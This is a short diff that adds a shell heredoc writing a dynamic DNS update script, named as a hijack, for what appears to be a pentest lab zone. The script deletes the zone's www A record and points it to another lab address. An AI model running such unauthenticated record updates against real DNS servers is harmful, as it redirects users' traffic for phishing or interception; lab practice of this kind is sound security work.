@@ -1,0 +1,7 @@
+cat > ddns_hijack.txt <<EOF
+server 192.168.34.133
+zone dnspentest.lab.
+update delete www.dnspentest.lab A
+update add www.dnspentest.lab 60 A 192.168.34.129
+send
+EOF
